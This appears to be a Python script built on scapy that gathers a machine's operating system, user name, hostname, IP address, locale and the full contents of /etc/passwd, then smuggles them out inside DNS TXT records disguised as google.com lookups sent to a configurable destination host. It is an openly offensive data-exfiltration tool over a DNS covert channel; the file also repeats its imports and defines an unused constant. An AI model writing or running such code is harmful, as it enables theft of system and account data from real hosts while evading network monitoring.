from scapy.all import *
import platform
import getpass
import socket
import locale
import time

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR


SOURCE_IP = '1.2.3.4'


from scapy.all import *
import platform
import getpass
import socket
import locale
import time

from scapy.layers.dns import DNS, DNSQR, DNSRR


DEST_IP = '127.0.0.1'  # Update with the actual destination IP address

def get_details():
    os = platform.system()
    os_version = platform.release()
    user = getpass.getuser()
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    language = locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "Unknown"
    password_file = open('/etc/passwd', 'r').read()
    return os, os_version, user, hostname, ip, language, password_file


# This function sends the DNS query to the server with the given site name
def send_dns_query(site, hostname, ip, language, password_file):
    ip = IP(dst=DEST_IP)  # Update with the actual destination IP address
    udp = UDP(sport=RandShort(), dport=53)
    dns = DNS(rd=1, qd=DNSQR(qname=site, qtype="TXT", qclass="IN"))
    dns.an = DNSRR(rrname=site, type="TXT", rclass="IN", ttl=1, rdata=f"Hostname: {hostname}, IP: {ip}, Language: {language}, Password File: {password_file}")
    packet = ip / udp / dns
    send(packet, verbose=0)


if __name__ == '__main__':
    details = get_details()  # Get the details of the system
    hostname = details[3]  # Extract the hostname from the details
    ip = details[4]  # Extract the IP address from the details
    language = details[5]  # Extract the language from the details
    password_file = details[6]  # Extract the password file contents from the details

    for detail in details[:3]:  # Only iterate over the desired system details
        site = detail.strip() + '.google.com'
        print(site)
        send_dns_query(site, hostname, ip, language, password_file)

    print("Sending password file...")
    site = "password_file.google.com"
    send_dns_query(site, hostname, ip, language, password_file)
    time.sleep(1)
